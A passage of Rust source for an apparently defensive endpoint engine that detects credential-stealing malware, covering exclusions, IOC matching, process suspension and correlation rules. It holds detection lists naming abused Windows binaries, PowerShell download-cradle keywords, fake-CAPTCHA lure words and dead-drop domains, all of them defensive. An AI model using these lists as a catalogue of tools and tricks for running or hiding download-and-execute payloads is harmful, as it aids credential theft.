//! Engine internals: per-event dispatch, builtin rules ST-01…ST-16 / TP-01…TP-05,
//! IOCs, exclusions, custom Sigma rules, per-process correlation state and the
//! "suspend on suspicion" verdict window.
//!
//! # Pipeline
//!
//! `process(event)` updates the process table (ProcessStart / ProcessStop),
//! dispatches the event to the rules for its kind, then evaluates custom Sigma
//! rules routed to that kind. Every rule hit goes through one emission path
//! ([`EngineState::emit`]):
//!
//! 1. rule mode from `Policy::rules`, else the rule's default (`Off` → dropped);
//! 2. never the Kestrel agent itself, PID 0 / 4 (tamper reports excepted);
//! 3. an `Allow` IOC on the process's sha256 / signer suppresses every rule;
//! 4. exclusions (path glob with drive, `*` = one segment, `**` = any depth;
//!    sha256; signer with a *valid* signature; image name; global or per
//!    rule; honouring `expires_at`) suppress the alert — never for TP-* rules;
//! 5. dedup: one alert per rule per process GUID per 10 minutes, except
//!    escalations (a strong rule that would kill a process held in a suspend
//!    window). A deduplicated re-hit in Protect mode still emits its *new*
//!    actions (e.g. a block for a new exfil destination) as `Output::Action`;
//! 6. Audit → alert without actions; Protect → alert with actions. Actions are
//!    filtered: critical OS processes and Microsoft security products
//!    ([`crate::protect`]: exact location on the system volume + valid
//!    Microsoft signature) are never killed or suspended, only images in
//!    user-writable locations are quarantined, shared OS binaries never lose
//!    their network, and the Kestrel server IPs are never blocked.
//!
//! # Trust
//!
//! `SignatureState::Unknown` is never trusted (owners, benign readers,
//! allow-IOCs, signer exclusions, protected processes). The platform computes
//! hash + signature synchronously for first-seen images within a budget and
//! re-feeds late facts through [`EngineState::enrich_process`], which re-runs
//! hash/certificate IOCs, ST-12 and ST-08(b) and re-judges suspend windows.
//!
//! # Suspend on suspicion
//!
//! A user-mode sensor is asynchronous, so a stealer could finish before a
//! correlation completes. In Protect mode, ST-01 (credential-store read by an
//! untrusted process), ST-03 (foreign DPAPI unprotect) and the opt-in ST-12
//! (untrusted execution from user paths) emit `SuspendProcess` and open a
//! verdict window of `policy.suspend_window_ms` for that GUID:
//!
//! * if a **strong rule** (ST-02, ST-04, ST-07, ST-16) fires in Protect mode
//!   for the suspended GUID — or for its parent or one of its children, since a
//!   frozen process cannot itself connect out — the strong rule's alert carries
//!   `KillProcess{tree:true}` for the suspended process plus `QuarantineFile`
//!   of its image (and `BlockDestination` for ST-04's address) and the window
//!   closes;
//! * if the window expires (`tick`) and the process is **unsigned, invalidly
//!   signed or still unknown, runs from a user-writable path, and was caught
//!   by ST-01 or ST-03**,
//!   `tick` returns `Output::Action(KillProcess{tree:true})` and
//!   `Output::Action(QuarantineFile)`;
//! * otherwise the window expires with `Output::Action(ResumeProcess)`;
//! * if the process exits while suspended, the window is dropped silently.
//!
//! A strong rule in Audit mode never escalates a window; the window then runs
//! to expiry as above.
//!
//! # Correlation state
//!
//! Per process GUID: categories of secrets read (last-touch time per
//! category), stores touched (for the plain-language summary), accumulated
//! `data_at_risk`, matched evidence (≤ 20 events), time of the last
//! untrusted credential read and foreign DPAPI unprotect, DNS answers
//! (IP → host, bounded), ST-13 candidacy and per-rule last-fired times.
//! Global: recent browser terminations and kill intents (ST-08), Chromium
//! remote-debugging ports seen on command lines (ST-06), pending ClickFix
//! kills (ST-10). State is dropped when the process is evicted from the table
//! or after 15 minutes of inactivity.
//!
//! A credential read only counts for ST-02 / ST-04 when it satisfies the
//! ST-01 condition (non-owner, not on the benign-reader allow-list, not a
//! trusted Windows binary) and the process is not excluded from ST-01;
//! likewise DPAPI events count only when not excluded from ST-03. Excluding a
//! backup tool from ST-01 therefore also stops ST-02/ST-04 for its reads.

use crate::canary::{self, is_conditional_canary};
use crate::catalog::*;
use crate::families::{Ctx, Family, FamilyHit};
use crate::paths::{
    benign_reader_for, glob_match, glob_match_path, is_browser_image, is_canary_ignored_reader,
    is_chromium_image, is_mozilla_image, is_trusted_owner, is_untrusted_location_or_signature,
    match_normalized, may_be_sensitive, normalize_path, SensitiveStore,
};
use crate::protect;
use crate::sigma::{self, SigmaEvent, SigmaRule};
use crate::util::*;
use crate::{CanarySpec, DetectError, Detection, HostContext, Output, ProcessTable};
use kestrel_common::*;
use std::collections::{HashMap, HashSet, VecDeque};
use std::sync::{Mutex, OnceLock};
use uuid::Uuid;

const DEDUP_MS: i64 = 10 * 60 * 1000;
const ST02_WINDOW_MS: i64 = 60_000;
const ST02_MIN_CATEGORIES: usize = 3;
const ST04_WINDOW_MS: i64 = 300_000;
const ST08_WINDOW_MS: i64 = 1_000;
const ST08_MIN_STOPS: usize = 2;
const ST08_ATTRIBUTION_MS: i64 = 5_000;
const CLICKFIX_WINDOW_MS: i64 = 10_000;
const DEBUG_PORT_TTL_MS: i64 = 30 * 60 * 1000;
const STATE_IDLE_MS: i64 = 15 * 60 * 1000;
const EVICT_INTERVAL_MS: i64 = 10_000;
const MAX_EVIDENCE: usize = 20;
const MAX_ANCESTRY: usize = 6;
const MAX_DNS_PER_PROC: usize = 256;
const MAX_TOUCHED: usize = 32;
const BLOCK_TTL_SECS: u64 = 24 * 3600;
const NUM_CATEGORIES: usize = 14;
const LARGE_IMAGE_BYTES: u64 = 100 * 1024 * 1024;

/// Windows binaries attackers abuse; never treated as "trusted system" readers.
const LOLBINS: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "powershell_ise.exe",
    "cmd.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "msbuild.exe",
    "regasm.exe",
    "regsvcs.exe",
    "installutil.exe",
    "addinprocess.exe",
    "addinprocess32.exe",
    "aspnet_compiler.exe",
    "csc.exe",
    "vbc.exe",
    "jsc.exe",
    "esentutl.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "curl.exe",
    "robocopy.exe",
    "xcopy.exe",
    "conhost.exe",
    "forfiles.exe",
    "msiexec.exe",
    "wmic.exe",
    "cmstp.exe",
    "dllhost.exe",
    "hh.exe",
    "odbcconf.exe",
    "pcalua.exe",
    "tar.exe",
    "makecab.exe",
    "finger.exe",
    "msxsl.exe",
    "mavinject.exe",
    "control.exe",
    "installutil.exe",
    "cvtres.exe",
    "ilasm.exe",
    "caspol.exe",
    "applaunch.exe",
    "dfsvc.exe",
    "presentationhost.exe",
];

/// .NET Framework binaries used as hollowing hosts (ST-13).
const DOTNET_LOLBINS: &[&str] = &[
    "msbuild.exe",
    "regasm.exe",
    "regsvcs.exe",
    "installutil.exe",
    "addinprocess.exe",
    "addinprocess32.exe",
    "aspnet_compiler.exe",
    "vbc.exe",
    "csc.exe",
    "jsc.exe",
    "cvtres.exe",
    "ilasm.exe",
    "caspol.exe",
    "applaunch.exe",
    "aspnet_regbrowsers.exe",
    "dfsvc.exe",
];

/// Expected (developer tooling) parents of .NET build binaries.
const DOTNET_EXPECTED_PARENTS: &[&str] = &[
    "devenv.exe",
    "msbuild.exe",
    "dotnet.exe",
    "servicehub.host.dotnet.x64.exe",
    "vbcscompiler.exe",
    "code.exe",
    "rider64.exe",
    "msvsmon.exe",
    "tfsbuildservice.host.exe",
    "agent.worker.exe",
    "runner.worker.exe",
    "jenkins.exe",
    "java.exe",
    "cmd.exe",
    "nuget.exe",
    "vsixinstaller.exe",
];

/// Shells / script hosts and LOLBins that ClickFix payloads run through (ST-11).
const CLICKFIX_SHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "cmd.exe"];
const CLICKFIX_LOLBINS: &[&str] = &[
    "mshta.exe",
    "wscript.exe",
    "cscript.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "msiexec.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "curl.exe",
    "conhost.exe",
    "forfiles.exe",
    "msbuild.exe",
    "finger.exe",
    "wget.exe",
    "pcalua.exe",
    "hh.exe",
];
/// Names a RunMRU / TypedPaths entry may invoke (ST-10).
const RUNMRU_LOLBINS: &[&str] = &[
    "powershell",
    "pwsh",
    "mshta",
    "curl",
    "conhost",
    "forfiles",
    "cmd",
    "msiexec",
    "rundll32",
    "certutil",
    "bitsadmin",
    "wscript",
    "cscript",
    "regsvr32",
    "finger",
    "wget",
];
const LURE_WORDS: &[&str] = &[
    "captcha",
    "robot",
    "human",
    "verif",
    "cloudflare",
    "turnstile",
    "ray id",
    "i am not",
    "i'm not",
    "security check",
    "confirm",
    "validation",
    "press enter",
    "authenticat",
    "access code",
    "fix",
];
const CRADLE_WORDS: &[&str] = &[
    "downloadstring",
    "downloadfile",
    "downloaddata",
    "net.webclient",
    "invoke-webrequest",
    "invoke-restmethod",
    "start-bitstransfer",
    "invoke-expression",
    "frombase64string",
    "[char]",
    "-join",
    "msxml2.xmlhttp",
    "winhttp.winhttprequest",
];
const CRADLE_TOKENS: &[&str] = &["iex", "irm", "iwr", "wget", "curl"];

/// Benign bundled-NSS users (ST-09).
const NSS_BUNDLERS: &[&str] = &[
    "soffice.bin",
    "soffice.exe",
    "sbase.exe",
    "swriter.exe",
    "zotero.exe",
    "postbox.exe",
    "pidgin.exe",
];

/// Chromium application directories trusted by the elevation service (ST-08).
const BROWSER_APP_DIRS: &[&str] = &[
    r"\google\chrome\application\",
    r"\google\chrome beta\application\",
    r"\google\chrome dev\application\",
    r"\google\chrome sxs\application\",
    r"\microsoft\edge\application\",
    r"\microsoft\edge beta\application\",
    r"\microsoft\edge dev\application\",
    r"\microsoft\edge sxs\application\",
    r"\bravesoftware\brave-browser\application\",
    r"\bravesoftware\brave-browser-beta\application\",
    r"\chromium\application\",
    r"\vivaldi\application\",
];

/// ST-15: trusted components and their legitimate install directories.
const SIDELOAD_HOSTS: &[&str] = &[
    "mpcmdrun.exe",
    "nissrv.exe",
    "msmpeng.exe",
    "mpdlpcmd.exe",
    "mpcopyaccelerator.exe",
    "configsecuritypolicy.exe",
    "msedge.exe",
    "msedge_proxy.exe",
    "msedgewebview2.exe",
];
const SIDELOAD_DLLS: &[&str] = &["mpclient.dll", "msedge_elf.dll", "mpsvc.dll"];
const SIDELOAD_LEGIT_DIRS: &[&str] = &[
    r"\program files\windows defender\",
    r"\program files (x86)\windows defender\",
    r"\programdata\microsoft\windows defender\platform\",
    r"\program files\microsoft\edge\application\",
    r"\program files (x86)\microsoft\edge\application\",
    r"\program files (x86)\microsoft\edgewebview\application\",
    r"\program files\microsoft\edgewebview\application\",
    r"\program files (x86)\microsoft\edge beta\application\",
    r"\program files (x86)\microsoft\edge dev\application\",
    r"\appdata\local\microsoft\edge sxs\application\",
    r"\windows\system32\",
    r"\windows\syswow64\",
];

/// Services that legitimately talk to a dead-drop domain (ST-14 owner exemption).
const DOMAIN_OWNERS: &[(&str, &[&str])] = &[
    (
        "telegram.org",
        &[
            "telegram.exe",
            "ayugram.exe",
            "kotatogram.exe",
            "64gram.exe",
            "updater.exe",
        ],
    ),
    ("t.me", &["telegram.exe"]),
    (
        "steamcommunity.com",
        &["steam.exe", "steamwebhelper.exe", "steamservice.exe"],
    ),
    (
        "steampowered.com",
        &["steam.exe", "steamwebhelper.exe", "steamservice.exe"],
    ),
    (
        "discord.com",
        &[
            "discord.exe",
            "discordptb.exe",
            "discordcanary.exe",
            "update.exe",
        ],
    ),
    (
        "discordapp.com",
        &[
            "discord.exe",
            "discordptb.exe",
            "discordcanary.exe",
            "update.exe",
        ],
    ),
    ("binance.org", &["binance.exe"]),
];

fn builtin_meta() -> &'static HashMap<String, RuleMeta> {
    static M: OnceLock<HashMap<String, RuleMeta>> = OnceLock::new();
    M.get_or_init(|| catalog().into_iter().map(|m| (m.id.clone(), m)).collect())
}

pub(crate) fn catalog() -> Vec<RuleMeta> {
    let mut v = builtin_catalog();
    v.extend(crate::families::catalog());
    v
}

fn cat_index(c: DataCategory) -> usize {
    c as usize
}

pub(crate) fn is_lolbin(name: &str) -> bool {
    LOLBINS.contains(&name)
}

// ---------------------------------------------------------------------------
// Exclusions & IOCs
// ---------------------------------------------------------------------------

struct Excl {
    kind: ExclusionKind,
    value: String,
    rule_id: Option<String>,
    expires_at: Option<TimestampMs>,
}

/// Normalise a path for exclusion matching: lower-case, `\`, keeps the drive
/// letter. Driveless rooted paths are anchored on the system drive; device
/// paths that were never mapped to a drive (`\Device\HarddiskVolumeN\…`)
/// return `None` (their volume is unknown, so they never match).
fn excl_path(path: &str, system_drive: char) -> Option<String> {
    let raw = path.trim().replace('/', "\\").to_ascii_lowercase();
    let raw = raw.trim_start_matches(r"\\?\").trim_start_matches(r"\??\");
    if raw.starts_with(r"\device\") && !raw.starts_with(r"\device\mup\") {
        return None;
    }
    let n = normalize_path(raw);
    if n.starts_with('\\') && !n.starts_with(r"\\") {
        Some(format!("{system_drive}:{n}"))
    } else {
        Some(n)
    }
}

impl Excl {
    fn new(x: &Exclusion, system_drive: char) -> Excl {
        let v = x.value.trim();
        let value = match x.kind {
            ExclusionKind::Path => excl_path(v, system_drive).unwrap_or_default(),
            ExclusionKind::Image => file_name_lower(v),
            _ => v.to_ascii_lowercase(),
        };
        Excl {
            kind: x.kind,
            value,
            rule_id: x.rule_id.clone(),
            expires_at: x.expires_at,
        }
    }

    /// Path exclusion semantics (M1): the full path **including the drive** is
    /// compared case-insensitively; `*` matches within one path segment,
    /// `**` across segments; a value without wildcards matches that file or,
    /// as a directory, everything below it (a trailing `\` forces directory).
    fn matches(&self, p: &ProcessInfo, rule: &str, now: TimestampMs, system_drive: char) -> bool {
        if self.value.is_empty() {
            return false;
        }
        if let Some(r) = &self.rule_id {
            if !r.eq_ignore_ascii_case(rule) {
                return false;
            }
        }
        if self.expires_at.is_some_and(|t| now >= t) {
            return false;
        }
        match self.kind {
            ExclusionKind::Sha256 => p
                .sha256
                .as_deref()
                .is_some_and(|h| h.eq_ignore_ascii_case(&self.value)),
            ExclusionKind::Signer => {
                p.signer
                    .as_deref()
                    .is_some_and(|s| s.trim().eq_ignore_ascii_case(&self.value))
                    && p.signed == SignatureState::Valid
            }
            ExclusionKind::Image => !p.image.is_empty() && file_name_lower(&p.image) == self.value,
            ExclusionKind::Path => {
                if p.image.is_empty() {
                    return false;
                }
                let Some(img) = excl_path(&p.image, system_drive) else {
                    return false;
                };
                if self.value.contains('*') || self.value.contains('?') {
                    glob_match_path(&self.value, &img)
                } else if self.value.ends_with('\\') {
                    img.starts_with(&self.value)
                } else {
                    img == self.value
                        || (img.starts_with(&self.value)
                            && img.as_bytes().get(self.value.len()) == Some(&b'\\'))
                }
            }
        }
    }
}

#[derive(Clone)]
struct IocHit {
    id: String,
    value: String,
    action: IocAction,
    description: String,
}

#[derive(Default)]
struct Iocs {
    hashes: HashMap<String, IocHit>,
    certs: HashMap<String, IocHit>,
    ips: HashMap<String, IocHit>,
    cidrs: Vec<(u128, u128, bool, IocHit)>,
    domains: Vec<(String, IocHit)>,
    urls: Vec<(String, IocHit)>,
}

fn ip_to_u128(ip: std::net::IpAddr) -> (u128, bool) {
    match ip {
        std::net::IpAddr::V4(v) => (u32::from(v) as u128, true),
        std::net::IpAddr::V6(v) => match v.to_ipv4_mapped() {
            Some(v4) => (u32::from(v4) as u128, true),
            None => (u128::from(v), false),
        },
    }
}

impl Iocs {
    fn build(list: &[Ioc]) -> Iocs {
        let mut s = Iocs::default();
        for i in list {
            let hit = IocHit {
                id: i.id.clone(),
                value: i.value.clone(),
                action: i.action,
                description: i.description.clone(),
            };
            let v = i.value.trim().to_ascii_lowercase();
            if v.is_empty() {
                continue;
            }
            match i.kind {
                IocKind::Sha256 => {
                    s.hashes.insert(v, hit);
                }
                IocKind::Certificate => {
                    s.certs.insert(v.replace([' ', ':'], ""), hit.clone());
                    s.certs.insert(v, hit);
                }
                IocKind::Ip => {
                    if let Some((addr, len)) = v.split_once('/') {
                        if let (Some(ip), Ok(len)) = (parse_ip(addr), len.parse::<u32>()) {
                            let (a, v4) = ip_to_u128(ip);
                            let bits = if v4 { 32 } else { 128 };
                            // Sanity bound: a /0../7 (v4) or /0../31 (v6) "IOC"
                            // is a mistake that would kill and block every
                            // process talking to the Internet. Ignore it.
                            if (v4 && len < 8) || (!v4 && len < 32) {
                                continue;
                            }
                            let len = len.min(bits);
                            let mask = if len == 0 {
                                0
                            } else {
                                (!0u128 << (bits - len)) & if v4 { 0xffff_ffff } else { !0 }
                            };
                            s.cidrs.push((a & mask, mask, v4, hit));
                        }
                    } else if let Some(ip) = parse_ip(&v) {
                        s.ips.insert(ip.to_string(), hit);
                    }
                }
                IocKind::Domain => s.domains.push((entry_host(&v), hit)),
                IocKind::Url => {
                    let host = entry_host(&v);
                    let bare = v.split("://").nth(1).unwrap_or(&v).to_string();
                    s.urls.push((bare, hit.clone()));
                    if !host.is_empty() && v.contains('/') {
                        // URL host also blocks resolution / connections to the host.
                        let mut h = hit;
                        h.description = if h.description.is_empty() {
                            format!("host of URL IOC {}", i.value)
                        } else {
                            h.description
                        };
                        s.domains.push((host, h));
                    }
                }
            }
        }
        s
    }

    fn by_hash(&self, p: &ProcessInfo) -> Option<&IocHit> {
        p.sha256
            .as_deref()
            .and_then(|h| self.hashes.get(&h.to_ascii_lowercase()))
    }

    fn by_cert(&self, p: &ProcessInfo) -> Option<&IocHit> {
        let s = p.signer.as_deref()?.trim().to_ascii_lowercase();
        self.certs.get(&s)
    }

    fn by_ip(&self, ip: &str) -> Option<&IocHit> {
        let parsed = parse_ip(ip)?;
        if let Some(h) = self.ips.get(&parsed.to_string()) {
            return Some(h);
        }
        let (a, v4) = ip_to_u128(parsed);
        self.cidrs
            .iter()
            .find(|(net, mask, cv4, _)| *cv4 == v4 && a & mask == *net)
            .map(|c| &c.3)
    }

    fn by_domain(&self, host: &str) -> Option<&IocHit> {
        let h = host.trim_end_matches('.').to_ascii_lowercase();
        self.domains
            .iter()
            .find(|(d, _)| host_matches(&h, d))
            .map(|d| &d.1)
    }

    fn by_url_in(&self, text_lower: &str) -> Option<&IocHit> {
        self.urls
            .iter()
            .find(|(u, _)| !u.is_empty() && text_lower.contains(u.as_str()))
            .map(|u| &u.1)
    }

    fn allowed_process(&self, p: &ProcessInfo) -> bool {
        self.by_hash(p)
            .is_some_and(|h| h.action == IocAction::Allow)
            || self
                .by_cert(p)
                .is_some_and(|h| h.action == IocAction::Allow && p.signed == SignatureState::Valid)
    }
}

// ---------------------------------------------------------------------------
// Per-process and global state
// ---------------------------------------------------------------------------

#[derive(Default)]
struct ProcState {
    cat_ts: [Option<TimestampMs>; NUM_CATEGORIES],
    data_at_risk: Vec<DataCategory>,
    touched: Vec<(&'static str, &'static str)>,
    evidence: VecDeque<Event>,
    first_cred_ts: Option<TimestampMs>,
    last_cred_ts: Option<TimestampMs>,
    last_dpapi_ts: Option<TimestampMs>,
    dns: HashMap<String, String>,
    st13: Option<&'static str>,
    fired: Vec<(String, TimestampMs)>,
    /// A kill was already ordered for this process (don't suspend it again).
    killed: bool,
    /// Fingerprints of response actions already ordered for hits on this
    /// process, so deduplicated re-hits only carry *new* actions (L9).
    ordered: HashSet<String>,
    last_activity: TimestampMs,
}

impl ProcState {
    fn add_category(&mut self, c: DataCategory, ts: TimestampMs) {
        self.cat_ts[cat_index(c)] = Some(ts);
        if !self.data_at_risk.contains(&c) {
            self.data_at_risk.push(c);
            self.data_at_risk.sort();
        }
    }
    fn categories_within(&self, now: TimestampMs, window: TimestampMs) -> usize {
        self.cat_ts
            .iter()
            .filter(|t| t.is_some_and(|t| t <= now && now - t <= window))
            .count()
    }
    fn touch(&mut self, app: &'static str, noun: &'static str) {
        if self.touched.len() < MAX_TOUCHED && !self.touched.contains(&(app, noun)) {
            self.touched.push((app, noun));
        }
    }
    fn add_evidence(&mut self, e: &Event) {
        if self.evidence.back() == Some(e) {
            return;
        }
        if self.evidence.len() >= MAX_EVIDENCE {
            self.evidence.pop_front();
        }
        self.evidence.push_back(e.clone());
    }
    fn cred_ts(&self) -> Option<TimestampMs> {
        match (self.last_cred_ts, self.last_dpapi_ts) {
            (Some(a), Some(b)) => Some(a.max(b)),
            (a, b) => a.or(b),
        }
    }
    fn last_fired(&self, rule: &str) -> Option<TimestampMs> {
        self.fired.iter().find(|(r, _)| r == rule).map(|f| f.1)
    }
    fn set_fired(&mut self, rule: &str, ts: TimestampMs) {
        if let Some(f) = self.fired.iter_mut().find(|(r, _)| r == rule) {
            f.1 = ts;
        } else {
            self.fired.push((rule.to_string(), ts));
        }
    }
}

#[derive(Debug, Clone)]
struct SuspendWindow {
    guid: ProcessGuid,
    pid: u32,
    image: String,
    sha256: Option<String>,
    quarantine: bool,
    deadline: TimestampMs,
    kill_at_expiry: bool,
    /// The opening rule kills at expiry when the image turns out to be
    /// untrusted (ST-01 / ST-03); re-judged on late enrichment.
    kill_capable: bool,
}

struct ClickfixPending {
    writer: ProcessGuid,
    until: TimestampMs,
    lolbin: &'static str,
    protect: bool,
}

#[derive(Default)]
struct CanaryState {
    /// Armed driveless prefixes (directories or files).
    armed: Vec<String>,
    /// Offered conditional decoys (armed on confirmation).
    conditional: Vec<String>,
}

/// One rule hit, before mode / exclusion / dedup handling.
struct Hit {
    rule: String,
    guid: ProcessGuid,
    severity: Severity,
    summary: String,
    /// Proposed Protect-mode actions (filtered at emission).
    actions: Vec<ResponseAction>,
    /// Open a suspend window (Protect only).
    suspend: bool,
    /// Kill instead of resume at window expiry.
    kill_at_expiry: bool,
    /// Strong rule: escalates suspend windows of this process / parent / children.
    strong: bool,
    escalation_ip: Option<(String, u16)>,
    /// Extra evidence (events of other processes).
    extra_evidence: Vec<Event>,
    /// Tamper reports: skip agent self-suppression.
    tamper: bool,
    /// Process override (when the subject isn't in the table).
    process: Option<ProcessInfo>,
    /// Force mode (IOC block / audit).
    mode_override: Option<RuleMode>,
    /// Metadata override (Sigma / IOC).
    name: Option<String>,
    author: Option<String>,
    attack: Option<Vec<String>>,
    /// Dedup key when it differs from the rule id (IOC alerts dedup per indicator).
    dedup_key: Option<String>,
}

impl Hit {
    fn new(rule: &str, guid: &ProcessGuid, severity: Severity, summary: String) -> Hit {
        Hit {
            rule: rule.to_string(),
            guid: guid.clone(),
            severity,
            summary,
            actions: vec![],
            suspend: false,
            kill_at_expiry: false,
            strong: STRONG_RULES.contains(&rule),
            escalation_ip: None,
            extra_evidence: vec![],
            tamper: false,
            process: None,
            mode_override: None,
            name: None,
            author: None,
            attack: None,
            dedup_key: None,
        }
    }
}

fn kill(p: &ProcessInfo, tree: bool) -> ResponseAction {
    ResponseAction::KillProcess {
        pid: p.pid,
        guid: Some(p.guid.clone()),
        tree,
    }
}

fn quarantine(p: &ProcessInfo) -> ResponseAction {
    ResponseAction::QuarantineFile {
        path: p.image.clone(),
        sha256: p.sha256.clone(),
    }
}

fn placeholder(guid: &ProcessGuid, pid: u32, ts: TimestampMs) -> ProcessInfo {
    ProcessInfo {
        guid: guid.clone(),
        pid,
        ppid: 0,
        parent_guid: None,
        image: String::new(),
        cmdline: String::new(),
        user: None,
        integrity: None,
        start_ts: ts,
        exit_ts: None,
        signer: None,
        signed: SignatureState::Unknown,
        sha256: None,
        motw_zone: None,
        file_size: None,
        path_class: PathClass::Other,
    }
}

/// Volume-aware path class: only the system drive can be System / Windows /
/// Program Files; unmapped `\Device\…` paths never are (see
/// [`PathClass::of_with_system_drive`]).
fn path_class_of(image: &str, system_drive: char) -> PathClass {
    PathClass::of_with_system_drive(image, system_drive)
}

/// Signature that grants no trust: unsigned, invalid (incl. revoked) or not
/// known yet.
fn untrusted_sig(s: SignatureState) -> bool {
    s != SignatureState::Valid
}

fn describe(p: &ProcessInfo) -> String {
    if p.image.is_empty() {
        format!("process {}", p.pid)
    } else {
        describe_proc(p)
    }
}

fn short_name(p: &ProcessInfo) -> String {
    if p.image.is_empty() {
        format!("process {}", p.pid)
    } else {
        crate::paths::file_name(&p.image).to_string()
    }
}

fn stores_phrase(touched: &[(&'static str, &'static str)]) -> String {
    let mut groups: Vec<(&str, Vec<String>)> = Vec::new();
    for (app, noun) in touched {
        match groups.iter_mut().find(|g| g.0 == *app) {
            Some(g) => g.1.push((*noun).to_string()),
            None => groups.push((app, vec![(*noun).to_string()])),
        }
    }
    let mut parts: Vec<String> = groups
        .iter()
        .take(4)
        .map(|(app, nouns)| format!("{app} {}", join_and(nouns)))
        .collect();
    if groups.len() > 4 {
        parts.push(format!("{} other stores", groups.len() - 4));
    }
    parts.join(", plus ")
}

/// "0.7 s" below ten seconds, "14 s" above.
fn fmt_secs(ms: i64) -> String {
    let ms = ms.max(0);
    if ms < 10_000 {
        format!("{:.1} s", ms as f64 / 1000.0)
    } else {
        format!("{} s", ms / 1000)
    }
}

fn truncate(s: &str, n: usize) -> String {
    if s.chars().count() <= n {
        s.to_string()
    } else {
        format!("{}…", s.chars().take(n).collect::<String>())
    }
}

fn dpapi_browser(desc: &str) -> Option<&'static str> {
    let d = desc.to_ascii_lowercase();
    [
        ("chrome", "Chrome"),
        ("edge", "Edge"),
        ("opera", "Opera"),
        ("brave", "Brave"),
        ("chromium", "Chromium"),
        ("vivaldi", "Vivaldi"),
        ("yandex", "Yandex"),
        ("browser", "browser"),
    ]
    .iter()
    .find(|(k, _)| d.contains(k))
    .map(|(_, n)| *n)
}

fn access_rights(mask: u32) -> String {
    let mut r = Vec::new();
    if mask & 0x10 != 0 {
        r.push("read");
    }
    if mask & 0x20 != 0 {
        r.push("write");
    }
    if mask & 0x2 != 0 {
        r.push("create-thread");
    }
    format!("{} access (0x{mask:x})", r.join("/"))
}

/// Why a command line looks like a paste-and-run payload.
fn clickfix_reason(cmd_lower: &str, child: &str) -> Option<&'static str> {
    let lure = cmd_lower.contains('#') && LURE_WORDS.iter().any(|w| cmd_lower.contains(w));
    if lure {
        return Some("a fake-CAPTCHA lure comment");
    }
    let hidden = has_hidden_window(cmd_lower);
    let encoded = has_encoded_command(cmd_lower) || cmd_lower.contains("frombase64string");
    let cradle = CRADLE_WORDS.iter().any(|w| cmd_lower.contains(w))
        || CRADLE_TOKENS.iter().any(|w| contains_word(cmd_lower, w));
    let url = cmd_lower.contains("http://")
        || cmd_lower.contains("https://")
        || cmd_lower.contains("@ssl\\");
    if CLICKFIX_SHELLS.contains(&child) {
        if encoded {
            return Some("an encoded command");
        }
        if hidden && (cradle || url) {
            return Some("a hidden download-and-execute command");
        }
        if cradle && url {
            return Some("a download-and-execute command");
        }
        if hidden && child != "cmd.exe" {
            return Some("a hidden window");
        }
        return None;
    }
    if child == "mshta.exe"
        && (url || cmd_lower.contains("javascript:") || cmd_lower.contains("vbscript:"))
    {
        return Some("mshta loading remote script");
    }
    if url || hidden || encoded {
        return Some("a remote payload");
    }
    None
}

/// Lower-case data of a RunMRU / TypedPaths value: which LOLBin it invokes, if suspicious.
fn runmru_lolbin(data_lower: &str) -> Option<&'static str> {
    let d = data_lower.trim_end_matches("\\1").trim();
    // The invoked program is the earliest LOLBin named in the entry.
    let bin = RUNMRU_LOLBINS
        .iter()
        .filter_map(|b| word_pos(d, b).map(|p| (p, *b)))
        .min_by_key(|(p, _)| *p)
        .map(|(_, b)| b);
    let cradle = CRADLE_WORDS.iter().any(|w| d.contains(w))
        || ["iex", "irm", "iwr"].iter().any(|w| contains_word(d, w));
    let url = d.contains("http://") || d.contains("https://") || d.contains("@ssl\\");
    let hidden = has_hidden_window(d);
    let encoded = has_encoded_command(d);
    let lure = d.contains('#') && LURE_WORDS.iter().any(|w| d.contains(w));
    match bin {
        Some(b @ ("conhost" | "forfiles" | "finger")) if has_arguments(d) => Some(b),
        Some(b) if cradle || url || hidden || encoded || lure => Some(b),
        None if cradle => Some("powershell"),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Engine
// ---------------------------------------------------------------------------

pub(crate) struct EngineState {
    host: HostContext,
    system_drive: char,
    agent_image: String,
    agent_guids: HashSet<ProcessGuid>,
    server_ips: HashSet<String>,
    policy: Policy,
    exclusions: Vec<Excl>,
    iocs: Iocs,
    exfil_hosts: Vec<String>,
    table: ProcessTable,
    states: HashMap<ProcessGuid, ProcState>,
    suspends: Vec<SuspendWindow>,
    sigma: Vec<SigmaRule>,
    sigma_kinds: u32,
    browser_stops: VecDeque<(TimestampMs, u32)>,
    last_browser_start: TimestampMs,
    kill_intents: VecDeque<(TimestampMs, ProcessGuid)>,
    debug_ports: HashMap<u16, TimestampMs>,
    clickfix: Vec<ClickfixPending>,
    canaries: Mutex<CanaryState>,
    out: Vec<Output>,
    last_evict: TimestampMs,
    /// RW / CD / PS rule families (see `families`).
    families: Vec<Box<dyn Family>>,
}

fn kind_bit(k: EventKind) -> u32 {
    1u32 << (k as u32)
}

impl EngineState {
    pub fn new(host: HostContext, policy: Policy, bundle: RuleBundle) -> Result<Self, DetectError> {
        let sigma = sigma::compile_bundle(&bundle.rules)?;
        let agent_image = if host.agent_image.trim().is_empty() {
            String::new()
        } else {
            driveless(&host.agent_image)
        };
        let server_ips = host
            .server_ips
            .iter()
            .filter_map(|s| parse_ip(s))
            .map(|i| i.to_string())
            .collect();
        let system_drive = host
            .system_drive
            .filter(|c| c.is_ascii_alphabetic())
            .map(|c| c.to_ascii_lowercase())
            .unwrap_or('c');
        let mut s = EngineState {
            host,
            system_drive,
            agent_image,
            agent_guids: HashSet::new(),
            server_ips,
            policy: Policy::default(),
            exclusions: vec![],
            iocs: Iocs::default(),
            exfil_hosts: vec![],
            table: ProcessTable::default(),
            states: HashMap::new(),
            suspends: vec![],
            sigma: vec![],
            sigma_kinds: 0,
            browser_stops: VecDeque::new(),
            last_browser_start: i64::MIN,
            kill_intents: VecDeque::new(),
            debug_ports: HashMap::new(),
            clickfix: vec![],
            canaries: Mutex::new(CanaryState::default()),
            out: vec![],
            last_evict: 0,
            families: crate::families::all(),
        };
        s.set_sigma(sigma);
        s.update_policy(policy);
        Ok(s)
    }

    fn set_sigma(&mut self, rules: Vec<SigmaRule>) {
        self.sigma_kinds = rules
            .iter()
            .fold(0, |acc, r| acc | kind_bit(r.route.kind()));
